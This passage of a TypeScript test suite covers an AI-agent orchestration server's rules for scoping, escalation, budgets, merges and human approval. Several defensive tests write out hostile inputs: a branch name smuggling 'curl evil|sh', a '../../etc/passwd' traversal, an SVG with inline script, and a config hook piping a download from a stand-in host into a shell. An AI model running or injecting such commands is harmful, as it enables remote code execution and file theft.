  expect(q("SELECT state AS v FROM job WHERE grp_id = 1 AND kind = 'agent_turn' ORDER BY id DESC LIMIT 1")).toBe(
    "cancelled",
  );
  // A question that outlives its requirement sits in 待办 forever.
  expect(q("SELECT chain_state AS v FROM escalation WHERE grp_id = 1")).toBe("revoked");
  expect(q("SELECT status AS v FROM grp WHERE id = " + grpId)).toBe("RUNNING");
});

test("a planner may propose dropping already-covered work, but only with evidence", async () => {
  // "There is nothing to do here" is the most attractive thing a tired model can
  // conclude, so a sentence alone must not be able to close a requirement — that is
  // the model's opinion of its own workload. The server checks the evidence, and
  // the boss still presses the button.
  const h = harness();
  h.db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'dispatcher', 'm', 'tok-d', 0)",
  );
  h.db.run("INSERT INTO grp (project_id, name, status, created_at) VALUES (1, 'other', 'RUNNING', 0)");
  const drop = (b: unknown, tok = "tok-d") => post(h.app, "/orch/drop", b, tok);

  expect((await drop({ group_id: 1, why: "已经做完了" })).status).toBe(422);
  expect((await drop({ group_id: 1, why: "短", duplicate: 2 })).status).toBe(422);
  expect((await drop({ group_id: 1, why: "grp2 已经覆盖了这件事", duplicate: 1 })).status).toBe(422);
  // A writer cannot decide its own work is unnecessary.
  expect((await drop({ group_id: 1, why: "grp2 已经覆盖了这件事", duplicate: 2 }, "tok-eng")).status).toBe(422);

  expect((await drop({ group_id: 1, why: "grp2 已经覆盖了这件事", duplicate: 2 })).status).toBe(200);
  const st = (await (await get(h.app, "/api/state")).json()) as any;
  const p = st.dropProposals.find((x: any) => x.grpId === 1);
  expect(p.body).toContain("grp2 已经覆盖");
  expect(p.body).toContain("other");
  // Still the boss's call: proposing does not dissolve anything.
  expect(h.db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).not.toBe(
    "DISSOLVED",
  );
});

test("the boundary request quotes each group's own requirement", async () => {
  const { app, db } = harness();
  // The pre-existing group's idea has to be recoverable, or the Architect cannot
  // tell the groups apart — observed live, it gave one group the other's files.
  db.run(
    "INSERT INTO event (grp_id, author, kind, body, at) VALUES (1, 'boss', 'boss_say', 'greet 加中文支持', 1)",
  );
  const r = await post(app, "/api/ideas", { project_id: 1, text: "farewell: bye(name) 返回 goodbye X" });
  const { grp_id } = (await r.json()) as { grp_id: number };

  const job = db
    .query<{ payload_json: string }, [number]>(
      "SELECT payload_json FROM job WHERE grp_id = ? AND payload_json LIKE '%architect%'",
    )
    .get(grp_id)!;
  const boundary = JSON.parse(job.payload_json).boundary as Array<{ id: number; idea: string }>;
  expect(boundary.find((g) => g.id === 1)?.idea).toContain("greet");
  expect(boundary.find((g) => g.id === grp_id)?.idea).toContain("bye");
});

test("a project is a repository, and a path is not one", async () => {
  const { app } = harness();
  // There is no host-path flow left to mistype into: `repo_path` holds
  // `owner/name` and the picker only offers repositories the app is installed
  // on. A body without one is refused rather than half-registered.
  const r = await post(app, "/api/projects", { name: "p", repo_path: "/Users/me/code/thing" });
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("owner/name");
});

test("registering a repo you cannot push to succeeds, and says so at once", async () => {
  // The whole value of this check is *when* the boss learns. Read access is
  // enough to clone and work, so registration is not refused — but a group that
  // does everything and then cannot push is the worst moment to find out, and an
  // `if` plus an emit is exactly what gets tidied away by someone who does not
  // know why it is there.
  const { app, db, ctx } = harness();
  ctx.gh = {
    remaining: () => null,
    request: async <T,>() => ({
      ok: true as const,
      status: 200,
      data: {
        full_name: "someone/theirs",
        default_branch: "main",
        clone_url: "https://github.com/someone/theirs.git",
        permissions: { pull: true, push: false },
      } as T,
    }),
  };

  const r = await post(app, "/api/projects", { repo: "someone/theirs" });
  expect(r.status).toBe(200);
  expect(db.query<{ c: number }, []>("SELECT count(*) AS c FROM project WHERE repo_path = 'someone/theirs'").get()!.c).toBe(1);

  // Named level, so the boss knows what to ask for rather than that "something"
  // is wrong.
  const said = db
    .query<{ body: string }, []>("SELECT body FROM event WHERE severity = 'blocker' ORDER BY seq DESC LIMIT 1")
    .get()!.body;
  expect(said).toContain("READ");
  expect(said).toContain("someone/theirs");
});

test("the directory list marks git repos and what is already registered", async () => {
  const { app, db } = harness();
  const root = mkdtempSync(join(tmpdir(), "orch-dirs-"));
  mkdirSync(join(root, "a-plain"));
  mkdirSync(join(root, "b-repo/.git"), { recursive: true });
  mkdirSync(join(root, "c-taken/.git"), { recursive: true });
  mkdirSync(join(root, ".hidden"));
  db.run("INSERT INTO project (name, repo_path, created_at) VALUES ('t', ?, 0)", [join(root, "c-taken")]);

  const r = await get(app, `/api/dirs?path=${encodeURIComponent(root)}`);
  expect(r.status).toBe(200);
  const out = (await r.json()) as any;
  // Repos first: the boss is looking for one, so burying them under plain folders
  // makes the picker useless in a deep tree.
  expect(out.dirs.map((d: any) => d.name)).toEqual(["b-repo", "c-taken", "a-plain"]);
  expect(out.dirs.find((d: any) => d.name === "b-repo").repo).toBe(true);
  expect(out.dirs.find((d: any) => d.name === "c-taken").taken).toBe(true);
  expect(out.dirs.find((d: any) => d.name === "a-plain").repo).toBe(false);
  // Dotfiles are noise in a picker.
  expect(out.dirs.some((d: any) => d.name === ".hidden")).toBe(false);
  expect(out.parent).toBe(dirname(root));
});

test("an unreadable path is an error with the reason, not an empty list", async () => {
  const { app } = harness();
  const r = await get(app, "/api/dirs?path=/definitely/not/here");
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("no such file");
});

test("a closed PR whose branch cannot be reopened can still get a new one", async () => {
  const { app, db, ctx } = harness();
  db.run("UPDATE grp SET status = 'PAUSED', pr_number = 7, branch = 'orch/g1' WHERE id = 1");
  db.run("UPDATE project SET remote = 'git@github.com:me/x.git' WHERE id = 1");
  ctx.gh = { remaining: () => null, request: async <T,>() => ({ ok: true, status: 200, data: { number: 9 } as T }) };

  const r = await post(app, "/api/groups/1/newpr");
  expect(r.status).toBe(200);
  expect((await r.json()).number).toBe(9);
  const g = db
    .query<{ status: string; pr_number: number; merge_seq: number }, []>(
      "SELECT status, pr_number, merge_seq FROM grp WHERE id = 1",
    )
    .get()!;
  expect(g.status).toBe("PR_OPEN");
  expect(g.pr_number).toBe(9);
  // Back in the queue, or it would be finished work nobody merges.
  expect(g.merge_seq).toBeGreaterThan(0);
});

test("a failed second PR leaves the old number in place rather than none at all", async () => {
  // The push is refused. Since 007 step 5 that happens in the utility container
  // rather than on the host, so this is a sandbox command failing rather than
  // `ctx.git` — the assertion is about what the group is left holding either way.
  const { app, db, ctx } = harness((cmd) =>
    cmd.includes("push") ? { code: 1, out: "remote: Permission denied" } : {},
  );
  db.run("UPDATE grp SET status = 'PAUSED', pr_number = 7, branch = 'orch/g1' WHERE id = 1");
  db.run("UPDATE project SET remote = 'git@github.com:me/x.git' WHERE id = 1");
  // A GitHub that would happily open the PR. Without a number here the create
  // answers "no PR number in it" and the route 422s for a reason that has
  // nothing to do with the push — the test passes and asserts nothing.
  ctx.gh = {
    remaining: () => null,
    request: async <T,>() => ({ ok: true, status: 200, data: { number: 9 } as T }),
  };

  expect((await post(app, "/api/groups/1/newpr")).status).toBe(422);
  expect(db.query<{ pr_number: number }, []>("SELECT pr_number FROM grp WHERE id = 1").get()!.pr_number).toBe(7);
});

test("nobody confirms a merge by hand: GitHub is the only source, and it winds the group up", async () => {
  const { app, db, ctx } = harness();
  db.run("UPDATE grp SET status = 'PR_OPEN', pr_number = 7, merge_seq = 1 WHERE id = 1");

  // The button that asked the boss to confirm is gone. It dissolved a group on
  // trust, and one mis-click archived a branch whose PR was still open.
  //
  // 422 with the action named, where this used to be a 404. The list of actions
  // was in the route's regular expression and is a zod enum now, so "no such
  // action" is an answer rather than a missing page — which is the honest reply,
  // since `/api/groups/1/…` is very much a route that exists.
  const no = await post(app, "/api/groups/1/landed");
  expect(no.status).toBe(422);
  expect(await no.text()).toContain("action");
  expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("PR_OPEN");

  // What `pollPrs` calls when GitHub says MERGED. Delivered, and still visible.
  landGroup(ctx, 1, "github");
  const snap = (await (await get(app, "/api/state")).json()) as any;
  expect(snap.groups.some((g: any) => g.id === 1)).toBe(false);
  expect(snap.archived.map((g: any) => g.name)).toEqual(["g1"]);
});

test("raising a budget resumes the group and closes the question that asked", async () => {
  const { app, db } = harness();
  db.run("UPDATE grp SET status = 'PAUSED', budget_tokens = 100, spent_tokens = 120 WHERE id = 1");
  db.run(
    "INSERT INTO escalation (grp_id, severity, question, chain_state, created_at) VALUES (1, 'blocker', 'budget: g1 用完了', 'boss', 0)",
  );

  // 继续 alone is a lie: the scheduler will not admit an over-budget group.
  const resumed = await post(app, "/api/groups/1/resume");
  expect(resumed.status).toBe(422);
  expect(await resumed.text()).toContain("120/100");

  // A cap below what is already spent would stop it again on the next tick.
  expect((await post(app, "/api/groups/1/budget", { tokens: 110 })).status).toBe(422);

  expect((await post(app, "/api/groups/1/budget", { tokens: 300 })).status).toBe(200);
  const g = db.query<{ status: string; budget_tokens: number }, []>(
    "SELECT status, budget_tokens FROM grp WHERE id = 1",
  ).get()!;
  expect(g.status).toBe("RUNNING");
  expect(g.budget_tokens).toBe(300);
  expect(db.query<{ c: number }, []>("SELECT count(*) AS c FROM escalation WHERE answer IS NULL").get()!.c).toBe(0);
});

test("a sent-back DRAFT stops being approvable", async () => {
  const { app, db } = harness();
  db.run("UPDATE grp SET status = 'DRAFT' WHERE id = 1");
  db.run(
    `INSERT INTO note (grp_id, kind, lang, body, frontmatter_json, at)
     VALUES (1, 'decision', '中文', 'old card', '{"draft_card":1}', 1)`,
  );
  expect((await get(app, "/api/state")).status).toBe(200);

  await post(app, "/api/draft/1/reject", { reason: "切得太粗" });
  expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("PLANNING");
  // The rejected card is no longer offered as a decision.
  const snap = (await (await get(app, "/api/state")).json()) as any;
  expect(snap.draftCards).toEqual([]);
});

test("the boss can talk to the team, and triage decides what the words mean", async () => {
  const { app, db, ran } = harness();
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'pm', 'sonnet', 'tok-pm', 0)",
  );
  expect((await post(app, "/api/say", { group_id: 1, body: "" })).status).toBe(422);

  expect((await post(app, "/api/say", { group_id: 1, body: "测试写得太浅" })).status).toBe(200);
  const woken = ran.filter((j) => j.kind === "agent_turn");
  expect(woken.length).toBe(1);
  expect(JSON.parse(woken[0]!.payload_json).mail.from).toBe("boss");

  // respec is the one that matters: without it dissatisfaction only ever reads as
  // "change one line" and a wrong decomposition is never corrected.
  expect((await post(app, "/api/say", { group_id: 1, as: "respec", body: "方向错了" })).status).toBe(200);
  expect(db.query<{ status: string }, []>("SELECT status FROM grp WHERE id = 1").get()!.status).toBe("PLANNING");
});

test("the blackboard is readable: notes by project, by group, and by kind", async () => {
  const { app, db } = harness();
  db.run(
    `INSERT INTO note (project_id, grp_id, kind, lang, body, frontmatter_json, at)
     VALUES (1, 1, 'journal', '中文', 'moved token check into middleware', '{"files":["auth/mw.ts"],"gate":"pass"}', 10)`,
  );
  db.run(
    "INSERT INTO note (project_id, kind, lang, body, at) VALUES (1, 'lesson', '中文', 'QA 只看 diff，不重读全库', 20)",
  );
  // The DRAFT card is a note too, and it has its own screen; it must not show up here.
  db.run(
    `INSERT INTO note (project_id, grp_id, kind, lang, body, frontmatter_json, at)
     VALUES (1, 1, 'decision', '中文', 'card', '{"draft_card":1}', 30)`,
  );

  const all = (await (await get(app, "/api/notes?project=1")).json()) as any;
  expect(all.notes.map((n: any) => n.kind)).toEqual(["lesson", "journal"]);
  // A project-level lesson has no group, and that is exactly where it matters.
  expect(all.notes.find((n: any) => n.kind === "lesson").grpId).toBe(null);
  expect(all.notes.find((n: any) => n.kind === "journal").group).toBe("g1");

  const one = (await (await get(app, "/api/notes?group=1")).json()) as any;
  expect(one.notes.map((n: any) => n.kind)).toEqual(["journal"]);

  const kind = (await (await get(app, "/api/notes?project=1&kind=lesson")).json()) as any;
  expect(kind.notes.length).toBe(1);
});

test("skills are found through symlinks, and a block-scalar description is read", () => {
  const root = mkdtempSync(join(tmpdir(), "orch-skills-"));
  // A real machine's skills are mostly symlinks into plugins or a shared
  // .agents/skills, and a dirent for a symlink does not say "directory" — which hid
  // almost all of them.
  mkdirSync(join(root, "elsewhere/tidy"), { recursive: true });
  writeFileSync(
    join(root, "elsewhere/tidy/SKILL.md"),
    "---\nname: tidy\ndescription: |\n  Guard clauses first.\n  Then the happy path.\n---\nbody\n",
  );
  mkdirSync(join(root, ".claude/skills"), { recursive: true });
  symlinkSync(join(root, "elsewhere/tidy"), join(root, ".claude/skills/tidy"));
  mkdirSync(join(root, ".claude/skills/plain"), { recursive: true });
  writeFileSync(join(root, ".claude/skills/plain/SKILL.md"), "---\ndescription: one line\n---\nbody\n");

  const found = listSkills(root).filter((s) => s.scope === "project");
  expect(found.map((s) => s.name).sort()).toEqual(["plain", "tidy"]);
  expect(found.find((s) => s.name === "tidy")!.description).toBe("Guard clauses first. Then the happy path.");
  expect(found.find((s) => s.name === "plain")!.description).toBe("one line");
});

test("one box holding several unrelated asks becomes several requirements", async () => {
  const { app, db, ran } = harness();
  db.run("UPDATE grp SET status = 'PLANNING' WHERE id = 1");
  db.run(
    "INSERT INTO note (project_id, grp_id, kind, lang, body, at) VALUES (1, 1, 'fact', '中文', '记住我；导出 CSV；顺便问下缓存怎么配', 1)",
  );
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'dispatcher', 'opus', 'tok-disp', 0)",
  );

  // A split of one is not a split.
  const one = await post(app, "/orch/split", { group_id: 1, requirements: [{ idea: "只有一件事" }] }, "tok-disp");
  expect(one.status).toBe(422);
  expect(await one.text()).toContain("at least 2");

  const r = await post(
    app,
    "/orch/split",
    {
      group_id: 1,
      requirements: [
        { name: "remember-me", idea: "登录页加「记住我」" },
        { name: "csv-export", idea: "报表页加导出 CSV" },
      ],
      why: "两件事互不相关",
    },
    "tok-disp",
  );
  expect(r.status).toBe(200);

  // Two live requirements, each with its own dispatcher turn — so each gets its own
  // card, branch and PR, and the boss can accept or reject them apart.
  const live = db
    .query<{ id: number; name: string; status: string }, []>("SELECT id, name, status FROM grp ORDER BY id")
    .all();
  expect(live.map((g) => [g.name, g.status])).toEqual([
    ["g1", "DISSOLVED"],
    ["remember-me", "PLANNING"],
    ["csv-export", "PLANNING"],
  ]);
  const turns = ran.filter((j) => j.kind === "agent_turn" && JSON.parse(j.payload_json).role === "dispatcher");
  expect(turns.map((j) => j.grp_id)).toEqual([2, 3]);
  // Nothing the boss typed is lost: each child points back at the original paragraph.
  const child = db.query<{ body: string }, []>("SELECT body FROM note WHERE grp_id = 2").get()!;
  expect(child.body).toContain("记住我");
  expect(child.body).toContain("原始整段见 note #1");

  // g1's own dispatcher cannot reach into a child: each child gets its own turn
  // and its own agent, and a token is only good for the group it was hired into.
  const notMine = await post(
    app,
    "/orch/split",
    { group_id: 2, requirements: [{ idea: "a" }, { idea: "b" }] },
    "tok-disp",
  );
  expect(notMine.status).toBe(403);

  // After a card is approved there is a branch, and re-cutting is the boss's respec.
  db.run("UPDATE grp SET status = 'RUNNING' WHERE id = 2");
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 2, 'dispatcher', 'opus', 'tok-disp-2', 0)",
  );
  const late = await post(
    app,
    "/orch/split",
    { group_id: 2, requirements: [{ idea: "a" }, { idea: "b" }] },
    "tok-disp-2",
  );
  expect(late.status).toBe(422);
  expect(await late.text()).toContain("respec");
});

test("a group blocked outside its boundary hands the work on and waits for it", async () => {
  // The gap seen whole: pm-ai-agent's gate failed on a missing line in
  // tsconfig.json, which is not in its owns, so the sandbox refused the write. No
  // verb opened a requirement for it and `orch mail` creates no work, so it rewrote
  // its own code three times, escalated, and stopped.
  // The existence check runs in the group's own checkout, not the host's: the
  // caller named this path from inside `/work`, and the host main checkout sits on
  // whatever branch the boss last had out — so a file the group itself created
  // came back as "not a file in this repo". The fake stands in for the container.
  const present = new Set(["package.json", "src/a/x.ts", "tsconfig.json"]);
  const h = harness((cmd) => {
    const m = /^test -e '\/work\/(.+)'$/.exec(cmd);
    return m ? { code: present.has(m[1]!) ? 0 : 1 } : {};
  });
  h.db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/a/**"])]);
  const blocked = (b: unknown, tok = "tok-eng") => post(h.app, "/orch/blocked", b, tok);

  expect((await blocked({ group_id: 1, path: "tsconfig.json" })).status).toBe(422);
  // An invented path must not be able to stop a group. The `--why` here is long
  // enough to get past the length check, or this asserts that instead — which is
  // what it used to do, so the existence check was never covered at all.
  const invented = await blocked({ group_id: 1, path: "nope.json", why: "缺一行配置，闸门过不了" });
  expect(invented.status).toBe(422);
  expect(await invented.text()).toContain("not a file in your checkout");
  // Inside its own boundary it is expected to fix it — saying otherwise is the
  // cheap way out of difficult work.
  const mine = await blocked({ group_id: 1, path: "src/a/x.ts", why: "缺一行配置，闸门过不了" });
  expect(mine.status).toBe(422);
  expect(await mine.text()).toContain("inside your own boundary");

  const r = await blocked({ group_id: 1, path: "package.json", why: "缺 allowImportingTsExtensions，闸门必红" });
  expect(r.status).toBe(200);
  const target = ((await r.json()) as any).blocked_on as number;

  const me = h.db
    .query<{ status: string; blocked_on: number | null }, []>("SELECT status, blocked_on FROM grp WHERE id = 1")
    .get()!;
  expect(me.status).toBe("PAUSED");
  expect(me.blocked_on).toBe(target);
  // Nobody owns package.json, so it becomes a requirement the boss approves like
  // any other — planning starts without waiting for anyone.
  const planning = h.db
    .query<{ status: string }, [number]>("SELECT status FROM grp WHERE id = ?")
    .get(target)!;
  expect(planning.status).toBe("PLANNING");
});

test("a live group that owns the path gets it as an addition, not a rival group", async () => {
  // A second group for the same file would be refused by canStart anyway, so
  // opening one would only produce a requirement that can never start.
  const h = harness();
  const repo = mkdtempSync(join(tmpdir(), "orch-blocked2-"));
  writeFileSync(join(repo, "package.json"), "{}");
  h.db.run("UPDATE project SET repo_path = ? WHERE id = 1", [repo]);
  h.db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/a/**"])]);
  h.db.run(
    "INSERT INTO grp (project_id, name, status, owns_json, created_at) VALUES (1, 'owner', 'RUNNING', ?, 0)",
    [JSON.stringify(["package.json"])],
  );
  const r = await post(h.app, "/orch/blocked", { group_id: 1, path: "package.json", why: "缺一行配置，闸门必红" }, "tok-eng");
  expect(((await r.json()) as any).handedTo).toBe("owner");
  const p = JSON.parse(
    h.db.query<{ payload_json: string }, []>(
      "SELECT payload_json FROM job WHERE grp_id = 2 ORDER BY id DESC LIMIT 1",
    ).get()!.payload_json,
  );
  expect(p.role).toBe("pm");
  expect(p.rejection).toContain("package.json");
});

test("a question no answer can resolve becomes a requirement, and the group waits for it", async () => {
  // The commonest blocker on the queue is one no answer resolves: a config file is
  // wrong, four groups are red on one line. Answering means typing the fix into a
  // chat box for an agent that is not allowed to apply it, so these sat in 待办
  // until the boss did the work by hand.
  const h = harness();
  h.db.run("UPDATE grp SET status = 'PAUSED', paused_at = 1 WHERE id = 1");
  h.db.run(
    `INSERT INTO escalation (grp_id, severity, question, chain_state, created_at)
     VALUES (1, 'blocker', 'S1 连续 3 次没过闸门，根因是 tsconfig.json 少一行', 'boss', 0)`,
  );

  const r = await post(h.app, "/api/escalations/1/requirement", { text: "加 allowImportingTsExtensions" });
  expect(r.status).toBe(200);
  const { grp_id } = (await r.json()) as { grp_id: number };

  const made = h.db.query<{ status: string }, [number]>("SELECT status FROM grp WHERE id = ?").get(grp_id)!;
  expect(made.status).toBe("PLANNING");
  // The question is closed with a pointer, not left as a second thing to remember.
  const esc = h.db.query<{ answer: string; chain_state: string }, []>("SELECT answer, chain_state FROM escalation").get()!;
  expect(esc.chain_state).toBe("answered");
  expect(esc.answer).toContain(String(grp_id));
  // And the stopped group comes back by itself when that lands — same mechanism
  // as `orch blocked`, so this is not a new thing to remember either.
  expect(h.db.query<{ blocked_on: number | null }, []>("SELECT blocked_on FROM grp WHERE id = 1").get()!.blocked_on).toBe(
    grp_id,
  );
});

test("two groups cannot end up waiting on each other", async () => {
  // Both PAUSED for a stated reason, and the reason is each other. Nothing
  // downstream would notice: neither will ever dissolve, so neither is ever freed.
  const h = harness();
  const repo = mkdtempSync(join(tmpdir(), "orch-cycle-"));
  writeFileSync(join(repo, "shared.ts"), "");
  h.db.run("UPDATE project SET repo_path = ? WHERE id = 1", [repo]);
  h.db.run("UPDATE grp SET owns_json = ? WHERE id = 1", [JSON.stringify(["src/a/**"])]);
  h.db.run(
    "INSERT INTO grp (project_id, name, status, owns_json, blocked_on, created_at) VALUES (1, 'other', 'PAUSED', ?, 1, 0)",
    [JSON.stringify(["shared.ts"])],
  );
  const r = await post(h.app, "/orch/blocked", { group_id: 1, path: "shared.ts", why: "缺一行配置，闸门必红" }, "tok-eng");
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("already waiting on you");
});

test("a worktree that cannot be created withdraws the approval instead of retrying forever", async () => {
  // sweepApproved runs on the watchdog tick, so leaving the intent set retried a
  // permanent failure every thirty seconds and returned the error to nobody.
  // The clone is what cannot be created, and since 007 step 5 it fails inside
  // the group's own container rather than as a host `git worktree`.
  const h = harness((cmd) => (cmd.startsWith("git clone") ? { code: 1, err: "fatal: disk full" } : {}));
  h.db.run("UPDATE grp SET status = 'DRAFT', approved_at = 1 WHERE id = 1");

  await sweepApproved(h.ctx);
  const g = h.db
    .query<{ status: string; approved_at: number | null }, []>("SELECT status, approved_at FROM grp WHERE id = 1")
    .get()!;
  expect(g.approved_at).toBeNull();
  expect(g.status).toBe("DRAFT");
  const esc = h.db
    .query<{ chain_state: string; question: string }, []>("SELECT chain_state, question FROM escalation").get()!;
  expect(esc.chain_state).toBe("boss");
  expect(esc.question).toContain("批准没能落地");
});

test("a question carries one line for the queue, given or derived", () => {
  // Given: whatever the agent wrote, capped.
  expect(brief("卡在 playwright 没装", "long question…")).toBe("卡在 playwright 没装");
  // Missing: the first sentence, which usually names the problem. A question that
  // cannot be filed for want of a flag is an agent stuck on formatting.
  expect(brief(undefined, "S2 的验收跑不了。原因是 worktree 里没装 playwright")).toBe("S2 的验收跑不了");
  // Long: cut, with the cut marked.
  expect(brief("x".repeat(60), "q")).toBe(`${"x".repeat(39)}…`);
});

test("what a question is about comes from a closed set", () => {
  // Closed because the queue groups by it: free text gives twelve spellings of
  // "environment" and groups nothing.
  expect(askKind("env")).toBe("env");
  expect(askKind(" spec ")).toBe("spec");
  // Unknown or missing falls to `other` rather than being rejected. An agent
  // must never be stuck on a taxonomy — same rule as the brief.
  expect(askKind("环境")).toBe("other");
  expect(askKind(undefined)).toBe("other");
});


test("reads are scoped by the token too, not only writes", async () => {
  // `/orch/task` and the lease log never called agentOf. The mailbox's `/orch/`
  // prefix gate says which routes a sandbox can reach; it says nothing about who
  // is reaching them, so any group could read any other group's cards and build
  // logs by putting a number in the URL.
  const { app, db } = harness();
  db.run("INSERT INTO grp (project_id, name, status, created_at) VALUES (1, 'g2', 'RUNNING', 0)");
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 2, 'engineer', 'sonnet', 'tok-other', 0)",
  );
  db.run("INSERT INTO task (grp_id, title, created_at) VALUES (1, 'g1 only', 0)");
  db.run("INSERT INTO resource (name, template) VALUES ('browser', 'echo {url}')");
  db.run(
    "INSERT INTO lease (resource, grp_id, state, log_path, enqueued_at) VALUES ('browser', 1, 'done', '/tmp/nope.log', 0)",
  );

  expect((await get(app, "/orch/task")).status).toBe(401);
  expect(await (await withToken(app, "/orch/task", "tok-eng")).text()).toContain("g1 only");
  // The other group's engineer gets its own (empty) list, not this one's.
  expect(await (await withToken(app, "/orch/task", "tok-other")).text()).not.toContain("g1 only");

  expect((await get(app, "/orch/lease/1/log")).status).toBe(401);
  expect((await withToken(app, "/orch/lease/1/log", "tok-other")).status).toBe(403);
});

test("a group name an agent chose is still branch-shaped", async () => {
  // The name becomes `orch/<name>`, a docs/journal path, and an argument to a
  // shell command in the group's own sandbox. It used to be whatever 40
  // characters the splitting agent sent, `;` included.
  const { app, db } = harness();
  db.run("UPDATE grp SET status = 'PLANNING' WHERE id = 1");
  db.run(
    "INSERT INTO agent (project_id, grp_id, role, model, token, created_at) VALUES (1, 1, 'dispatcher', 'opus', 'tok-d', 0)",
  );
  const r = await post(
    app,
    "/orch/split",
    {
      group_id: 1,
      requirements: [
        { name: "a;curl evil|sh", idea: "first half" },
        { name: "../../etc/passwd", idea: "second half" },
      ],
    },
    "tok-d",
  );
  expect(r.status).toBe(200);
  const names = db.query<{ name: string }, []>("SELECT name FROM grp WHERE id > 1").all().map((g) => g.name);
  expect(names).toHaveLength(2);
  for (const n of names) expect(n).toMatch(/^[a-z0-9][a-z0-9.-]*$/);
});

test("an attachment cannot run as the panel", async () => {
  // Same origin as every API route, and there is no login in front of them — so
  // an `.svg` or an `.html` served inline is a script running as the boss. It is
  // also the one path around React's escaping, and the uploads are not all the
  // boss's: `attach/local` is reachable by anything holding an agent token.
  const h = harness();
  const dir = join(mkdtempSync(join(tmpdir(), "orch-attach-")), "attachments");
  h.ctx.config.dataDir = dirname(dir);
  mkdirSync(dir, { recursive: true });
  writeFileSync(join(dir, "x.svg"), '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>');
  writeFileSync(join(dir, "y.png"), "not really a png");

  const svg = await h.app(new Request("http://x/api/attach/x.svg"));
  expect(svg.headers.get("content-disposition")).toStartWith("attachment");
  expect(svg.headers.get("x-content-type-options")).toBe("nosniff");
  // For the types that do render inline, the CSP is what stops the second half.
  expect(svg.headers.get("content-security-policy")).toContain("default-src 'none'");

  // An image still has to show up in the panel, or the feature is off rather
  // than safe.
  const png = await h.app(new Request("http://x/api/attach/y.png"));
  expect(png.headers.get("content-disposition")).toStartWith("inline");
});

test("project config takes the keys it has, and says so about the rest", async () => {
  // `config_json` is not inert: `install` runs as a shell command in the sandbox
  // and `gates` decides which resources a slice must pass. Merging whatever
  // arrived meant an unknown key was either a typo that silently did nothing, or
  // a name some later version starts honouring — set by whoever reached this
  // route before anybody decided what it means.
  const h = harness();
  const patch = (b: unknown) =>
    h.app(new Request("http://x/api/project/1/config", { method: "POST", headers: { "content-type": "application/json" },
        body: JSON.stringify(b) }));

  expect((await patch({ install: "bun install" })).status).toBe(200);
  const bad = await patch({ hooks: "curl evil.example.com | sh" });
  expect(bad.status).toBe(422);
  expect(await bad.text()).toContain("hooks");
});

test("every route that takes a body declares its shape", () => {
  // The check that keeps the next route honest. `body<T>()` is gone — it parsed
  // JSON and swallowed a failure into `{}`, so a malformed request arrived as an
  // object whose every field was undefined and each handler re-derived what it
  // needed with its own `?? ""` and `String(...)`.
  const src = readFileSync(new URL("../src/api.ts", import.meta.url).pathname, "utf8");
  const undeclared = [...src.matchAll(/app\.(post|put|patch)\("([^"]+)"(.*)$/gm)]
    .filter((m) => !m[3]!.includes("check("))
    .map((m) => m[2]!);
  // The exceptions, named rather than tolerated: multipart upload reads
  // `req.formData()` itself, and the rest take no body at all.
  expect(undeclared).toEqual([
    // Login flows: the POST *is* the whole request. It starts or cancels a flow
    // and carries nothing.
    "/auth/claude/login",
    "/auth/claude/login/cancel",
    "/auth/github",
    "/auth/codex/device",
    "/auth/codex/device/cancel",
    // Buttons. Both act on the sandbox server and take no argument.
    "/sandbox-server/restart",
    "/sandbox-server/start",
    // Multipart: it reads `req.formData()` itself, which no JSON schema describes.
    "/attach",
    // A withdrawal, identified entirely by the id in the path.
    "/escalations/:id/revoke",
  ]);
});
